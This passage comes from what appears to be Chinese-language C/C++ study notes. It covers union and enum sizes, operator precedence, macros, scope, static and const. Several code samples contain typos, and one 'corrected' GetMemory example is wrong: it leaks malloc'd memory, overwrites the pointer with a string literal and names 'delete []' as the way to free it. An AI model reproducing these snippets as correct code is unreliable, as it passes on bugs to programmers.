class="line">&#125;;</span><br></pre></td></tr></table></figure><p>比如，上述结构体中f1占3个bits，b非位域类型，所以f1占用1个字节，abc总共占用3个字节。最后由于整个结构体的总大小为最宽基本类型成员int大小的整数倍，所以总共要占用4个字节。</p><h4 id="union的空间计算"><a href="#union的空间计算" class="headerlink" title="union的空间计算"></a>union的空间计算</h4><p>结构体在内存组织上是顺序式的，而联合体union是重叠式的，各成员共享一段内存，所以整个联合体的sizeof也就是每个成员sizeof的最大值，且整体空间是占用空间最大的成员(的类型)所占字节数的整数倍。即取占用内存最多的成员的空间作为自己的空间，且需要考虑对齐。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line"><span class="type">char</span> b[<span class="number">9</span>];</span><br><span class="line">    <span class="type">int</span> bh[<span class="number">2</span>];</span><br><span class="line">&#125;c;</span><br></pre></td></tr></table></figure><p>上述代码的union中，数组b占用9个字节，bh占用8个，考虑占用内存最大的成员，所以应该是占用9个字节；又需要考虑对齐，占用空间应该是4（int占用空间）的整数倍，所以补齐为12。</p><h4 id="枚举的空间计算"><a href="#枚举的空间计算" class="headerlink" title="枚举的空间计算"></a>枚举的空间计算</h4><p>enum仅定义一个常量集合，里面没有元素，而枚举类型均作为int类型存储，因此枚举类型的sizeof均为4。</p><hr><h2 id="4-运算符及其优先级"><a href="#4-运算符及其优先级" class="headerlink" title="4.  运算符及其优先级"></a>4.  运算符及其优先级</h2><h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><p>略</p><h3 id="自增与自减运算符"><a href="#自增与自减运算符" class="headerlink" title="自增与自减运算符"></a>自增与自减运算符</h3><p>以++操作为例，对于变量a, <code>++a</code>表示取a的地址，增加它的内容，然后把值放在寄存器中; <code>a++</code>表示取a的地址，把它的值装入寄存器，然后增加内存中a的值。<strong>前缀运算是“先变后用”，而后缀运算是“先用后变”。</strong></p><p><u><em>&#x3D;&#x3D;注意&#x3D;&#x3D;</em></u>：<code>a++</code>只能位于等号的右边，而<code>++a</code>可以位于等号的左边。</p><p>负号运算符与自增（减）运算符的优先级相同，结合方向是从右向左。比如<code>k=-i++</code>等价于<code>k=-(i++)</code>。</p><p>特别的，对于指针变量：</p><p><code>*p++</code>  实现了先输出p所指地址处的数据值，然后指针后移到下一指针处；</p><p><code>*++p</code>  实现了先将指针指向后移，再输出此时指针所指处的数据的值；</p><p><code>(*p)++</code> 实现的是将指针p所指向地址处的数据值（比如300）输出后再自增1（得到301）；</p><h3 id="关系与逻辑运算符"><a href="#关系与逻辑运算符" class="headerlink" title="关系与逻辑运算符"></a>关系与逻辑运算符</h3><p>关系操作符：&lt;、&lt;&#x3D;、&gt;、&gt;&#x3D;。具有<strong>左结合性质</strong>，先执行左边的部分。但是不建议将多个关系操作符串接使用。</p><p>在<code>if(i&lt;j&lt;k)</code>这种写法中，只要k大于1,上述表达式的值就为true。 这是因为第二个小于操作符的左操作<br>数是第一个小于操作符的结果: true 或false。 也就是，该条件将k与整数0或1做比较。为了实现我们想要的条件检验，应重写上述表达式如下：<code>if(i&lt;j &amp;&amp; j&lt;k)</code>。</p><p>逻辑与和逻辑或操作符总是先计算其左操作数，然后再计算其右操作数。<strong>只有在仅靠左操作数的值无法确定该逻辑表达式的结果时，才会求解其右操作数</strong>。我们常常称这种求值策略为“短路求值”。</p><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><p>位运算符使用整型操作数，将其视为二进制位的集合。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220623102913108.png" alt="image-20220623102913108"></p><p><strong><code>(n&amp;(n-1))==0</code>用于判断n的二进制表示是否仅有一位为1。</strong></p><p>异或运算满足交换律。两相同的数异或结果为0，可用于寻找数成对出现时缺失的某一个数。</p><p>例1：</p><blockquote><p>给你一个由n-1个整数组成的未排序的序列，其元素都是1到n中的不同的整数。请写出一个寻找序列中缺失整数的线性时间算法。</p><p>解答:</p><p>1)求这n-1个数的和sum,然后计算n(n+1)2-sum可得。此种解法当n很大时，加法运算有可能溢出。</p><p>2)用异或运算可以解决。首先求得从1到n共n个数的异或结果A，即A&#x3D;1^2^3..^n，然后用题目中的序列依次与A求异或，最后得到的数，就是丢失的整数。</p></blockquote><p>例2：</p><blockquote><p>不使用第三方变量，交换两个变量的值：</p><p>a&#x3D;a^b;<br>b&#x3D;a^b;<br>a&#x3D;a^b;</p></blockquote><p>&#x3D;&#x3D;<strong>~运算符的优先级 &gt; 移位运算符的优先级 &gt; 与、或、异或运算符的优先级。</strong>&#x3D;&#x3D;</p><h3 id="赋值转换"><a href="#赋值转换" class="headerlink" title="赋值转换"></a>赋值转换</h3><p>赋值转换指的是将一种类型的值赋给另一种类型的变量，这时，值将会转换为接收变量的类型。</p><p>比如<code>int val = 3.14;</code>得到的val为3，<code>int *p; p = 0;</code>中int型的0转换为int *类型的空指针。</p><p>当把一个超出其取值范围的值赋给一个指定类型的对象时，比如将一个 int 类型的数赋值为short类型的数，当前大多数的系统都是将int低字节赋值给short,而将高位舍去（相当于取余）。当把一个取值范围小的值赋给一个取值范围大的值，则进行符号位扩展。</p><h3 id="表达式转换"><a href="#表达式转换" class="headerlink" title="表达式转换"></a>表达式转换</h3><ul><li><p>整型提升<br>在表达式计算中，C++将bool、char、unsigned char、signed char、short 和signed short型值都会自<br>动转换成int型，对bool类型而言，true 转换为1, false 则转换为0。</p><p>&#x3D;&#x3D;<strong>同一类型的无符号类型与有符号类型所占内存空间相同，只不过无符号类型将符号位作为数值位而已。所以在C++中， 有符号数与无符号数转换时，内存中的内容并没改变，只是对内存中相同的数据解释不同而已。</strong>&#x3D;&#x3D;</p><blockquote><p>int和unsigned int混合运算时，int会被转换为unsigned int，内存的内容不变，但是符号位被当作数值，所表示的数值发生改变，且恒大于等于0。</p><p>比如int类型的-1的字节是100……001，共32位，第一位为符号位。由于在计算机中用补码表示数值（负数的补码为其符号位之外的位数求反然后加1），所以-1在内存中为其补码111……111。当其转为unsigned int时，所有位均表示数值，那么此数就是2^32-1。</p><p>所以unsigned int类型的变量一直减1，结果也不会小于0。</p></blockquote></li><li><p>运算时的转换</p><p>当运算涉及两种类型时，较小的类型将会被转换成较大的类型，换言之，表达力低的类型将会被转换成表达力高的类型。各类型表达能力从低到高排列为：</p><p><strong>int (等价于signed int)、unsigned int、long (等价与signed long) 、unsigned long、float、double、long double</strong></p></li></ul><p>&#x3D;&#x3D;<em>其余例题见P74例5</em>&#x3D;&#x3D;</p><h3 id="显示转换（强制类型转换）"><a href="#显示转换（强制类型转换）" class="headerlink" title="显示转换（强制类型转换）"></a>显示转换（强制类型转换）</h3><p>略</p><h3 id="运算符优先级表"><a href="#运算符优先级表" class="headerlink" title="运算符优先级表"></a>运算符优先级表</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220623211239436.png" alt="image-20220623211239436"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220623211447726.png" alt="image-20220623211447726"></p><p><strong>运算符优先级有几个简单的规则:</strong></p><ul><li>括号，下标，&gt;和.(成员)最高；</li><li>单目的比双目的高；算术双目的比其他双目的高；</li><li>移位运算高于关系运算；**关系运算高于按位运算(与，或，异或)**；按位运算高于逻辑运算；</li><li>三目的只有一个条件运算，低于逻辑运算；</li><li>赋值运算仅比”,“高，且所有的赋值运算符优先级相同，结合访问位从右向左。</li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220623212501031.png" alt="image-20220623212501031"></p><h2 id="5-C预处理器、作用域、static、const以及内存管理"><a href="#5-C预处理器、作用域、static、const以及内存管理" class="headerlink" title="5.  C预处理器、作用域、static、const以及内存管理"></a>5.  C预处理器、作用域、static、const以及内存管理</h2><h3 id="5-1-C预处理器"><a href="#5-1-C预处理器" class="headerlink" title="5.1 C预处理器"></a>5.1 C预处理器</h3><h4 id="宏定义与宏替换"><a href="#宏定义与宏替换" class="headerlink" title="宏定义与宏替换"></a>宏定义与宏替换</h4><p>宏定义不分配内存，变量定义才会分配内存。宏定义末尾不加分号。</p><p><code>#define</code>指示接受一个名字并定义该名字为预处理器变量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 符号常量的宏定义及宏替换</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> 标识符 字符串</span></span><br><span class="line"><span class="comment">// 带有参数的宏定义及宏替换，如#define FUN(x) ((x)*(x)) 为避免宏替换时发生错误，参数最好加上括号</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> 标识符(参数列表) 字符串</span></span><br></pre></td></tr></table></figure><p><strong>宏替换的本质很简单——文本替换</strong>。关于宏定义与宏替换请注意以下几点：</p><ul><li>宏名一般用大写（避免名字冲突），宏名和参数的括号间不能有空格，宏定义末尾不加分号；</li><li><strong>宏替换只作替换，不做语法检查，不做计算，不做表达式求解</strong>；</li><li><strong>宏替换在编译前进行，不分配内存</strong>，函数调用在编译后程序运行时进行，并且分配内存；</li><li>函数只有一个返回值，利用宏则可以设法得到多个值；</li><li>宏替换使源程序变长，函数调用不会；</li><li>宏替换不占运行时间，只占编译时间，函数调用占运行时间（分配内存、保留现场、值传递、返回值）。</li></ul><p>&#x3D;&#x3D;注意&#x3D;&#x3D;：应尽量少用宏替换。在C++中，宏替换实现的符号常量功能由const、enum代替，带参数的宏替换可由模版内联函数代替。</p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 标准头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;standard_header&gt;</span></span></span><br><span class="line"><span class="comment">// 非系统头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myfile.h&quot;</span></span></span><br></pre></td></tr></table></figure><h4 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h4><p>提供条件编译措施使同一源程序可以<strong>根据不同编译条件(参数)产生不同的目标代码</strong>，其作用在于便于调试和移植。条件编译控制语句有不同形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span>/<span class="keyword">ifdef</span>/<span class="keyword">ifndef</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>#ifndef</code>检测指定的预处理器变量是否未定义。如果预处理器变量未定义，那么跟在其后的所有语句都被处理，直到出现<code>#endif</code>。如果预处理器变量已定义，那么跟在其后直到出现<code>#endif</code>的所有语句都被忽略。</p><h3 id="5-2-全局变量与局部变量"><a href="#5-2-全局变量与局部变量" class="headerlink" title="5.2 全局变量与局部变量"></a>5.2 全局变量与局部变量</h3><ul><li><p><strong>全局变量</strong></p><p>在函数外部定义的变量，属于源程序文件，作用域为整个源程序。</p><p>在函数中使用全局变量时，需要说明使用的是全局变量。</p><p>在不同文件中引用一个已经定义过的全局变量：可以用引用头文件的方式，也可以用<strong>extern关键字</strong>。下面的代码给出了使用extern引用已经定义过的全局变量的例子。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file_ 1.cpp</span></span><br><span class="line"><span class="type">int</span> counter; <span class="comment">//定义counter</span></span><br><span class="line"><span class="comment">// file_ 2.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> counter;  <span class="comment">//使用file 1中的counter</span></span><br><span class="line">++counter; <span class="comment">// 使file_ 1中的counter自增1</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>局部变量</strong></p><p>在程序中，只在特定过程或函数中可以访问的变量。局部变量可以与全局变量同名且屏蔽全局变量。</p><p><strong>在语句的控制结构中定义的变量尽在定义它们的块语句结束前有效。这种变量的作用域限制在语句体内。</strong>比如比如while(int i &#x3D;get_num())中的i。</p><p><strong>在同一个文件中，当局部变量屏蔽了全局变量，而又想要使用全局变量时，有两种方法。一种是使用做用域操作符”::”，一种是使用”extern”。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">::counter++;</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> count; </span><br><span class="line">counter++;</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-3-static"><a href="#5-3-static" class="headerlink" title="5.3 static"></a>5.3 static</h3><h4 id="static的作用"><a href="#static的作用" class="headerlink" title="static的作用"></a>static的作用</h4><ul><li><p>**<u>隐藏：使变量不能被其他文件访问</u>**（对于函数和全局变量）</p><p>当编译多个文件时，所有未加static前缀的全局变量和函数都具有全局可见性，其他的源文件也能访问。如果加了static前缀就会对其他源文件隐藏。利用这一特性可以在不同的文件中定义同名函数和同名变量，不必担心命名冲突。</p></li><li><p><u><strong>默认初始化为0</strong></u>（未初始化的全局静态变量和局部静态变量）</p><p>初始化的全局变量和静态变量存放在DATA段，<strong>未初始化的全局变量和静态变量存放在BSS段（未初始化数据段）</strong>。在BSS段中，内存中所有的字节默认值都是0x00，某些时候这一特点可以减少程序员的工作量。<br>比如初始化一个稀疏矩阵，我们可以一个个地把所有元素都置0，然后把不是0的几个元素赋值。如果定义成静态的，就省去了一开始置0的操作。再比如要把一一个字符 数组当字符串来用，但又觉得每次在字符数组末尾加’\0’太麻烦。如果把字符串定义成静态的，就省去了这个麻烦，因为那里本来就是’\0’。</p><p><u>函数体外的内置数组，不管有没有static前缀，均会将各元素初始化为0；在函数体内定义的内置函数，若没有static前缀，各元素未初始化，其值不确定。</u></p></li><li><p><u><strong>保持局部变量内容的持久</strong></u></p><p>函数内的自动(局部)变量，当调用时就存在，退出函数时就消失，但静态局部变量虽然在函数内定义，但静态局部变量始终存在着，也就是说它的<strong>生存期为整个源程序</strong>，其特点是<strong>只进行一次初始化且具有“记忆性”</strong>。<br>静态局部变量的生存期虽然为整个源程序，但是<strong>其作用域仍与局部变量相同</strong>，即只能在定义该变量的函数内使用该变量。退出该函数后，尽管该变量还继续存在，但不能使用它。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> count=<span class="number">3</span>;    <span class="comment">// 外部变量</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> i, sum, count=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>, sum=<span class="number">0</span>; i&lt;count; i+=<span class="number">2</span>, count++) &#123; </span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count=<span class="number">4</span>; <span class="comment">//局部静态变量，只初始化一次</span></span><br><span class="line">        count++;</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="type">int</span> count;   <span class="comment">// 此处为外部变量，即第一行的count</span></span><br><span class="line">    count++ ;</span><br><span class="line">    sum += count; <span class="comment">//语句1，sum第一次循环+4，第二次循环+5</span></span><br><span class="line">    &#125;</span><br><span class="line">    sum +=count; <span class="comment">//语句2，此处count为局部静态变量，sum第一次循环+5，第二次循环+6</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;%d %d\n&quot;</span>, count, sum);   <span class="comment">// 此处为第三行的count，输出结果为4 20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="类中static的作用"><a href="#类中static的作用" class="headerlink" title="类中static的作用"></a>类中static的作用</h4><p>用于表示<strong>属于一个类而不属于此类的任何特定对象</strong>的变量和函数（与java中此关键字的含义相同）。</p><ul><li><p>静态数据成员</p><p>在类内数据成员的声明前加上关键字static，<strong>静态数据成员独立于该类的任意对象而存在，即当某个类的实例修改了该静态成员变量，其修改值为该类的其他所有实例所见。</strong>静态数据成员和普通数据成员一样遵从public, protected, private访问规则。</p><p>由于静态数据成员定义时需要分配空间，所以不能在类声明中定义。**&#x3D;&#x3D;static数据成员必须在类定义体的外部定义&#x3D;&#x3D;**。一般而言，类的static 成员，像普通数据成员一 样，不能在类的定义体中初始化，static数据成员通常在类定义体的外部定义时才初始化。即在类定义体中对静态变量赋初值是错误的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">class</span> <span class="title">Account</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">public</span>:</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">void</span> applyint() &#123; amount += amount*interestRate; &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">static</span> <span class="type">double</span> rate() &#123; <span class="keyword">return</span> interestRate; &#125;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">static</span> <span class="type">void</span> rate (<span class="type">double</span>); <span class="comment">// sets a new rate</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">private</span>:</span></span></span><br><span class="line"><span class="params"><span class="function">    std: :string Owner;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">double</span> amount ;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">static</span> <span class="type">double</span> interestRate;   <span class="comment">// 仅声明，需要在类外定义</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">static</span> <span class="type">double</span> interestRate=<span class="number">0.3</span>;  <span class="comment">// 错误，不可以在类定义体中对静态变量赋初值</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">static</span> <span class="type">double</span> initRate() ;</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;;</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">double</span> Account::interestRate = initRate();   <span class="comment">// 在类外定义</span></span></span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;例外：const static数据成员可以在类的定义体中进行初始化&#x3D;&#x3D;。基本整型const static数据成员在类的定义体中初始化时，该数据成员<strong>仍必须在类的定义体之外进行定义</strong>，只不过定义时，不再需要初始化。（相当于在类外定义，在类定义体中进行const static声明和初始化）</p><blockquote><p>例：C++中关于对象成员内存分布的描述正确的是（）。</p><p>A. 不管该类被产生多少个对象，静态成员变量永远只有一个实例，且在没有对象实例的情况下已经存在。<br>B, 费静态成员数据在类中的排列顺序将和其被声明的顺序相同，任何中间介入的静态成员都不会被放进对象的内存布局中。<br>C. 在同一访问段（也就是private，public，protected等区间段内），数据成员的排列符合“较晚出现的成员在对象中有较高的内存地址”。<br>D. 带有虚函数的类对象占用的内存大小跟虚函数的个数成正比。</p><p>解析：ABC。</p></blockquote><p><strong>类中数据成员的布局情况</strong>:</p><ol><li>非静态成员在类对象中的排列顺序和声明顺序一致， 任何在其中间声明的静态成员都不会被放进对象布局中。</li><li>静态数据成员存放在程序的全局(静态)存储中，和个别类对象无关。<br>C++标准规定，在同一个访问块即private、public、 protected 等区段中，成员的排列只需符合<strong>较晚出现的成员在类对象中有较高的地址</strong>即可。</li></ol></li><li><p>静态成员函数</p><p>​静态成员函数同样属于类定义的一部分，为类服务，而不是某个具体对象。普通成员函数总是具体的属于某个类的具体对象，所以普通的成员函数一般都隐含了一个this指针，this指针指向类的对象本身。但是静态成员由于不与任何的对象相关联，因此<strong>不具有this指针</strong>。<strong>因而它无法访问类对象的非静态数据成员，也无法访问非静成员函数，它只能调用其余的静态成员函数与访问静态数据成员。</strong><br>  static成员函数不是任何对象的组成部分，因此<strong>static成员函数不能声明const</strong>。毕竟，将成员函数声明为const后就承诺不会修改函数所属的对象，而static成员函数不属于任何对象。<br>  <strong>static成员函数也不能被声明为虚函数、volatile</strong>。</p><p>关于静态成员函数，可以总结为以下几点:</p><ul><li><strong>静态成员之间可以相互访问</strong>，包括静态成员函数访问静态数据成员和访问静态成员函数。**<u>静态成员函数不能访问非静态成员函数和非静态数据成员，非静态成员函数可以任意地访问静态成员函数和静态数据成员</u>**（静态成员变量可被该类的所有方法访问）;</li><li>由于没有this指针的额外开销，因此静态成员函数与类的非静态成员函数相比速度上会有少许的增长。</li></ul></li></ul><h3 id="5-4-const"><a href="#5-4-const" class="headerlink" title="5.4 const"></a>5.4 const</h3><h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><p>const限定符将一个对象转换为一个常量。常量在定义后就不能被修改，所以<strong>在定义时必须进行初始化</strong>。</p><p>在全局作用域里定义非const 变量时，它在整个程序中都可以访问。</p><p>但是除非特别说明，<strong>在全局作用域声明的const 变量是定义该对象的文件的局部变量</strong>。此变量只存在于那个<br>文件中，不能被其他文件访问。通过指定const 变更为extern，就可以在整个程序中访问const 对象：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file 1.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">int</span> counter=<span class="number">10</span>; <span class="comment">// 定义counter，extern使const常量可以被其他文件访问</span></span><br><span class="line"><span class="comment">// file 2.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">int</span> counter; <span class="comment">//使用file 1中的counter</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index=<span class="number">0</span>; index != counter; ++index)</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p><strong>在C语言中多使用#define进行常量声明</strong>。</p><p>如果在C中使用const，下面的语句在C语言中编译错误，因为在C中const意思是“一个不能被改变的普通变量”，即它被放在内存中，C编译器不知道它在编译时的值。但在C++中，下面的语句是可行的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> bufSize = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> buf[bufSize ];</span><br></pre></td></tr></table></figure><p><strong>const相比#define的优势：</strong></p><ul><li>const常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查。而对<br>后者只进行字符替换，没有类型安全检查；</li><li>使用常量可能比使用#define导致产生更小的目标代码，这是因为预处理器”盲目地将宏名称<br>BUFSIZE替换为其代替的值100”可能导致目标代码出现多份100的备份，但常量就不会出现这种情况。</li><li>const还可以执行常量折叠（常量折叠是在编译时间简单化常量表达的一个过程，简单来说就是将常量表达式计算求值，并用求得的值来替换表达式，放入常量表），也就是说，编译器在编译时可以通过必要的计算把一一个复杂的常量表达式缩减成简单的。</li></ul><p>综上，在C++中，我们应该用const取代#define。</p><h4 id="指针和const"><a href="#指针和const" class="headerlink" title="指针和const"></a>指针和const</h4><p>在指针的声明中，需要区分指向const对象的指针和const指针。</p><ul><li>指向const对象的指针</li></ul><p><strong>如果指针指向const对象</strong>，则不允许用指针来改变其所指的const值。为了保证这个特性，<strong>C++强制要求指向const对象的指针也必须具有const特性。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> *cptr = &amp;value;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="type">double</span> <span class="type">const</span> *cptr = &amp;value;</span><br></pre></td></tr></table></figure><p><strong>cptr是一个指向const double类型的指针，cptr 的值可以改变，但是不能通过ptr改变value的值；</strong></p><ul><li>const指针</li></ul><p><strong>使指针本身成为一个const指针</strong>，所指向的值可以改变，但是地址不变。声明时必须把const标明的部分放在*的右边，如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> value=<span class="number">0.1</span>;</span><br><span class="line"><span class="type">double</span>* <span class="type">const</span> cptr = &amp;value;  <span class="comment">// 由于指针是const，所以编译时必须有初始化</span></span><br></pre></td></tr></table></figure><p><strong>cptr 的值不可以改变，但是可以通过ptr改变value的值。</strong></p><h4 id="const修饰函数参数与返回值"><a href="#const修饰函数参数与返回值" class="headerlink" title="const修饰函数参数与返回值"></a>const修饰函数参数与返回值</h4><ul><li><p>const修饰返回值</p><p>const 修饰返回值常用在处理用户定义的类型时。当处理用户定义的类型时，返回值不为常量有时会对用户造成困扰。</p><p>函数除了返回值类型外，还可以<strong>返回指针</strong>。函数不能返回指向局部栈变量的指针，这是因为在函数返回后它们是无效的，而且栈也被清理了（栈会自动分配和释放）。<strong>可返回的指针是指向堆中分配的存储空间的指针或指向静态存储区的指针</strong>，在函数返回后它仍然有效。</p><p>比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">GetMemory</span> <span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> p[]=<span class="string">&quot;he1lo world&quot;</span>;   <span class="comment">// 数组，内存分配在栈上</span></span><br><span class="line">    <span class="keyword">return</span> P:   <span class="comment">// 返回指向栈内存的指针，但是由于是局部变量，返回时原来的内容已被清除，p指向的新内容不可知</span></span><br><span class="line">&#125;</span><br><span class="line">           </span><br><span class="line"><span class="type">void</span> <span class="built_in">Test</span> (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="type">char</span> *str-<span class="literal">NULL</span>;</span><br><span class="line">    str=<span class="built_in">GetMemory</span>();</span><br><span class="line">    <span class="built_in">printf</span>(str);   <span class="comment">// 输出可能是乱码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Test</span>();</span><br></pre></td></tr></table></figure><p>可以改为如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1) </span><br><span class="line">char *GetMemory (void) &#123;</span><br><span class="line">    static char p[]=&quot;hello world&quot; ;  // 数组位于静态存储区,生存周期为整个源程序，可通过函数返回</span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2) </span><br><span class="line">char *GetMemory (void) &#123;</span><br><span class="line">    char *p=&quot;hel1o world&quot;;  /* &quot;hel1o world&quot;位于文字常量区，所以p是指向全局(静态)存储区的指针，可通过函数返回*/</span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">3) </span><br><span class="line">char *GetMemory (void) &#123;</span><br><span class="line">    char *p = (char*)malloc(12);   /* p是指向堆中分配存储空间的指针，可通过函数返回，但需要以后调用delete []释放内存，否则会造成内存泄露*/</span><br><span class="line">    if(p == NULL)</span><br><span class="line">    return NULL;</span><br><span class="line">    else</span><br><span class="line">    P=&quot; hello world&quot;;</span><br><span class="line">    return P;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>const修饰函数参数</p><p>使参数值在函数体内不会发生改变。主要是用来修饰地址，使地址不发生改变。</p><p><strong>若使用值或者函数返回值作为函数参数，那么传递给函数的均为临时变量，会被函数作为常量，编译器会为其分派临时存储单元，并产生一个地址和其引用捆绑在一起，存储的内容是常量，所以实参必须是const。</strong></p><p><img 